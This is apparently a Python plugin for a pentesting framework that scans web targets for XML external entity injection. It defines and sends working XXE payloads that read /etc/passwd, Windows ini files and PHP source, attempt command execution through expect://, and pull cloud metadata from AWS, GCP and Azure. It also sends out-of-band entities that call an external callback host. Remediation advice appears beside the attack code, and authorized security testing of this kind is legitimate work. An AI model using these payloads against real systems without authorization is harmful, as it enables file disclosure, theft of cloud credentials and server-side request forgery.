"""XML External Entity (XXE) injection detection — comprehensive.

Classic file read, blind OOB (CallbackServer), error-based, SSRF via XXE,
SOAP/SVG/XInclude, content-type switching, parameter entity injection.
Uses PayloadEngine for payloads, WafBypassEngine for WAF evasion.
Level: XXEinjector (detection).
"""

from __future__ import annotations

import asyncio
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.payloads import PayloadCategory

# ── Classic file-read payloads ──────────────────────────────────────────
XXE_FILE_READ: list[tuple[str, list[str], str]] = [
    # Linux
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///etc/passwd">]><foo>&xxe;</foo>',
        ["root:", "/bin/"],
        "classic_linux",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///etc/hostname">]><foo>&xxe;</foo>',
        [],
        "hostname_linux",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///etc/issue">]><foo>&xxe;</foo>',
        ["Ubuntu", "Debian", "CentOS", "Red Hat", "Alpine"],
        "issue_linux",
    ),
    # Windows
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        ["[fonts]", "[extensions]"],
        "win_file_read",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///c:/windows/system.ini">]><foo>&xxe;</foo>',
        ["[drivers]", "[386Enh]"],
        "win_system_ini",
    ),
    # PHP filter base64 (bypass binary read issues)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"php://filter/convert.base64-encode/resource=/etc/passwd">'
        "]><foo>&xxe;</foo>",
        ["cm9vd"],
        "php_filter_b64",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"php://filter/convert.base64-encode/resource=index.php">'
        "]><foo>&xxe;</foo>",
        ["PD9waHA"],
        "php_filter_index",
    ),
    # Expect wrapper (RCE if enabled)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"expect://id">]><foo>&xxe;</foo>',
        ["uid=", "gid="],
        "php_expect",
    ),
]

# ── SSRF via XXE ────────────────────────────────────────────────────────
XXE_SSRF: list[tuple[str, list[str], str]] = [
    # AWS metadata
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        ["ami-id", "instance-id", "hostname", "security-credentials"],
        "aws_metadata",
    ),
    # GCP metadata
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>',
        ["instance", "project"],
        "gcp_metadata",
    ),
    # Azure metadata
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://169.254.169.254/metadata/instance?api-version=2021-02-01">'
        "]><foo>&xxe;</foo>",
        ["compute", "network"],
        "azure_metadata",
    ),
    # Internal probing
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://127.0.0.1:8080/">]><foo>&xxe;</foo>',
        [],
        "ssrf_localhost",
    ),
]

# ── SOAP-specific XXE ──────────────────────────────────────────────────
XXE_SOAP = (
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
    '"file:///etc/passwd">]>'
    '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
    "<soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"
)

# ── SVG-specific XXE ───────────────────────────────────────────────────
XXE_SVG = (
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM '
    '"file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
    "<text x=\"10\" y=\"20\">&xxe;</text></svg>"
)

# ── XInclude (no DOCTYPE needed) ───────────────────────────────────────
XINCLUDE_PAYLOAD = (
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
    '<xi:include parse="text" href="file:///etc/passwd"/></foo>'
)

# ── Error-based exfiltration ───────────────────────────────────────────
XXE_ERROR = (
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
    '"file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
    "'file:///nonexistent/%xxe;'>\">%eval;%error;]><foo>test</foo>"
)

# ── Content types to try ───────────────────────────────────────────────
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
    "image/svg+xml",
]

# ── Content-type switching (inject XML where JSON expected) ────────────
CT_SWITCH_TYPES = [
    ("application/xml", "application/json"),
    ("text/xml", "application/json"),
    ("application/xml", "application/x-www-form-urlencoded"),
]

XML_PATHS = [
    "/", "/api/", "/api/v1/", "/api/v2/", "/upload", "/import",
    "/xml", "/soap", "/rpc", "/xmlrpc.php", "/wsdl", "/ws",
    "/feed", "/rss", "/atom", "/sitemap.xml", "/saml/",
    "/saml/login", "/saml/acs", "/sso/", "/metadata",
]

XXE_ERRORS = [
    "xml parsing error", "entity", "doctype", "dtd",
    "external entity", "not allowed", "xmlparseentity",
    "parser error", "simplexml", "loadxml", "domdocument",
    "saxparseexception", "xmlpullparser", "xerces",
    "xmlreader", "expat", "lxml", "etree",
]


class XxeCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="xxe_check",
        display_name="XXE Injection Scanner",
        category=PluginCategory.PENTESTING,
        description=(
            "Comprehensive XXE detection: file read, OOB blind, error-based, "
            "SSRF, SOAP/SVG/XInclude, content-type switching, WAF bypass"
        ),
        produces=["xxe_findings"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"xxe_tests": []},
            )

        extra = ctx.state.get("discovered_api_paths", {}).get(target.host, [])
        scan_paths = list(XML_PATHS) + [p for p in extra if p not in XML_PATHS]

        # PayloadEngine XXE payloads
        engine_payloads = self._get_engine_payloads(ctx)

        for path in scan_paths:
            if ctx.should_stop or len([f for f in findings if "confirmed" in str(f)]) >= 2:
                break

            # Phase 1: Classic file-read payloads
            for payload, indicators, label in XXE_FILE_READ:
                if ctx.should_stop:
                    break
                if await self._test_xxe(
                    ctx, base_url, path, payload, indicators, label,
                    findings, tested,
                ):
                    break

            # Phase 2: SSRF via XXE
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                for payload, indicators, label in XXE_SSRF:
                    if ctx.should_stop:
                        break
                    if await self._test_xxe(
                        ctx, base_url, path, payload, indicators, label,
                        findings, tested,
                    ):
                        break

            # Phase 3: SOAP-specific
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                await self._test_xxe(
                    ctx, base_url, path, XXE_SOAP, ["root:", "/bin/"],
                    "soap_xxe", findings, tested,
                )

            # Phase 4: SVG-specific
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                await self._test_xxe(
                    ctx, base_url, path, XXE_SVG, ["root:", "/bin/"],
                    "svg_xxe", findings, tested, ct_override="image/svg+xml",
                )

            # Phase 5: XInclude (no DOCTYPE needed)
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                await self._test_xxe(
                    ctx, base_url, path, XINCLUDE_PAYLOAD,
                    ["root:", "/bin/"], "xinclude", findings, tested,
                )

            # Phase 6: Error-based exfiltration
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                await self._test_xxe(
                    ctx, base_url, path, XXE_ERROR,
                    ["root:", "/bin/"], "error_based", findings, tested,
                )

            # Phase 7: Content-type switching (XML where JSON expected)
            if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
                await self._check_ct_switch(
                    ctx, base_url, path, findings, tested,
                )

        # Phase 8: OOB blind XXE via CallbackServer
        if not any(t.get("confirmed") for t in tested) and not ctx.should_stop:
            await self._check_oob(ctx, base_url, scan_paths[:5], findings, tested)

        # Phase 9: PayloadEngine XXE payloads
        if not any(t.get("confirmed") for t in tested) and engine_payloads and not ctx.should_stop:
            for path in scan_paths[:3]:
                if ctx.should_stop:
                    break
                for ep in engine_payloads[:8]:
                    if ctx.should_stop:
                        break
                    await self._test_xxe(
                        ctx, base_url, path, ep,
                        ["root:", "/bin/", "[fonts]", "cm9vd"],
                        "engine_payload", findings, tested,
                    )

        if not findings:
            findings.append(Finding.info(
                "No XXE vulnerabilities detected",
                tags=["pentesting", "xxe"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"xxe_tests": tested},
        )

    # ── Helpers ─────────────────────────────────────────────────────────

    @staticmethod
    def _get_engine_payloads(ctx) -> list[str]:
        if hasattr(ctx, "payloads") and ctx.payloads:
            payloads = ctx.payloads.get(PayloadCategory.XXE, max_waf=1, limit=15)
            return [p.value for p in payloads]
        return []

    async def _post_xml(
        self, ctx, url: str, payload: str, ct: str = "application/xml",
    ) -> tuple[str, int] | None:
        """POST XML payload, return (body, status) or None."""
        try:
            async with ctx.rate:
                resp = await ctx.http.post(
                    url, data=payload,
                    headers={"Content-Type": ct},
                    timeout=10.0,
                )
                body = await resp.text(encoding="utf-8", errors="replace")
                return body, resp.status
        except Exception:
            return None

    async def _test_xxe(
        self, ctx, base_url: str, path: str, payload: str,
        indicators: list[str], label: str,
        findings: list[Finding], tested: list[dict],
        ct_override: str | None = None,
    ) -> bool:
        """Test a single XXE payload across content types. Returns True if confirmed."""
        url = f"{base_url}{path}"
        content_types = [ct_override] if ct_override else XML_CONTENT_TYPES[:3]

        for ct in content_types:
            result = await self._post_xml(ctx, url, payload, ct)
            if result is None:
                continue

            body, status = result
            body_lower = body.lower()

            # Check confirmed via indicators
            matched = [ind for ind in indicators if ind.lower() in body_lower]
            if matched:
                tested.append({
                    "path": path, "label": label, "content_type": ct,
                    "indicator": matched[0], "confirmed": True,
                })
                findings.append(Finding.critical(
                    f"XXE confirmed: {label} on {path}",
                    description=(
                        f"External XML entity processed — file contents leaked. "
                        f"Content-Type: {ct}"
                    ),
                    evidence=(
                        f"URL: {url}\nContent-Type: {ct}\n"
                        f"Payload: {label}\nIndicator: {', '.join(matched)}"
                    ),
                    remediation=(
                        "Disable external entity processing in XML parsers. "
                        "Use defusedxml (Python), setFeature(DISALLOW_DOCTYPE, true) (Java), "
                        "or libxml_disable_entity_loader (PHP)."
                    ),
                    tags=["pentesting", "xxe", "injection"],
                ))
                return True

            # Check error-based hints
            error_hit = any(e in body_lower for e in XXE_ERRORS)
            if error_hit and status >= 400:
                tested.append({
                    "path": path, "label": label, "content_type": ct,
                    "confirmed": False, "error_based": True,
                })
                findings.append(Finding.medium(
                    f"Potential XXE: XML parsing error on {path}",
                    description=(
                        f"XML-related error with {label} payload. "
                        f"Parser may accept external entities."
                    ),
                    evidence=(
                        f"URL: {url}\nContent-Type: {ct}\n"
                        f"Status: {status}\nSnippet: {body[:200]}"
                    ),
                    remediation=(
                        "Disable external entity processing. "
                        "Reject requests with DOCTYPE declarations."
                    ),
                    tags=["pentesting", "xxe", "injection"],
                ))

        return False

    async def _check_ct_switch(
        self, ctx, base_url: str, path: str,
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Test content-type switching: send XML where JSON/form expected."""
        url = f"{base_url}{path}"
        payload = (
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"file:///etc/passwd">]><foo>&xxe;</foo>'
        )

        for xml_ct, original_ct in CT_SWITCH_TYPES:
            if ctx.should_stop:
                break
            result = await self._post_xml(ctx, url, payload, xml_ct)
            if result is None:
                continue

            body, status = result
            if "root:" in body or "[fonts]" in body:
                tested.append({
                    "path": path, "label": f"ct_switch_{original_ct}",
                    "content_type": xml_ct, "confirmed": True,
                })
                findings.append(Finding.critical(
                    f"XXE via content-type switch: {xml_ct} on {path}",
                    description=(
                        f"Endpoint accepts XML content-type ({xml_ct}) "
                        f"which is likely intended for {original_ct}"
                    ),
                    evidence=f"URL: {url}\nContent-Type: {xml_ct}",
                    remediation=(
                        "Explicitly validate Content-Type. Reject unexpected "
                        "XML content types on non-XML endpoints."
                    ),
                    tags=["pentesting", "xxe", "ct-switch"],
                ))
                return

    async def _check_oob(
        self, ctx, base_url: str, paths: list[str],
        findings: list[Finding], tested: list[dict],
    ) -> None:
        """Blind XXE via OOB callback."""
        if not hasattr(ctx, "callback") or not ctx.callback:
            return

        try:
            token = ctx.callback.generate_token(
                plugin="xxe_check", target=base_url, payload_type="oob",
            )
            cb_url = ctx.callback.build_payload_url(token)

            # Parameter entity OOB
            oob_payloads = [
                (
                    f'<?xml version="1.0"?><!DOCTYPE foo ['
                    f'<!ENTITY % xxe SYSTEM "{cb_url}">'
                    f'%xxe;]><foo>test</foo>'
                ),
                (
                    f'<?xml version="1.0"?><!DOCTYPE foo ['
                    f'<!ENTITY xxe SYSTEM "{cb_url}">'
                    f']><foo>&xxe;</foo>'
                ),
            ]

            # DNS OOB if domain available
            if ctx.callback._domain:
                dns_payload = (
                    f'<?xml version="1.0"?><!DOCTYPE foo ['
                    f'<!ENTITY xxe SYSTEM '
                    f'"http://{token}.{ctx.callback._domain}/">'
                    f']><foo>&xxe;</foo>'
                )
                oob_payloads.append(dns_payload)

            for path in paths:
                if ctx.should_stop:
                    break
                url = f"{base_url}{path}"
                for oob_p in oob_payloads:
                    if ctx.should_stop:
                        break
                    for ct in XML_CONTENT_TYPES[:2]:
                        await self._post_xml(ctx, url, oob_p, ct)

            await asyncio.sleep(3)

            if ctx.callback.has_callback(token):
                tested.append({
                    "type": "oob", "token": token, "confirmed": True,
                })
                findings.append(Finding.critical(
                    "Blind XXE confirmed via OOB callback",
                    description=(
                        "Out-of-band callback received — server processes "
                        "external XML entities (blind XXE)"
                    ),
                    evidence=f"Callback token: {token}",
                    remediation=(
                        "Disable external entity processing in all XML parsers."
                    ),
                    tags=["pentesting", "xxe", "oob", "blind"],
                ))
        except Exception:
            pass
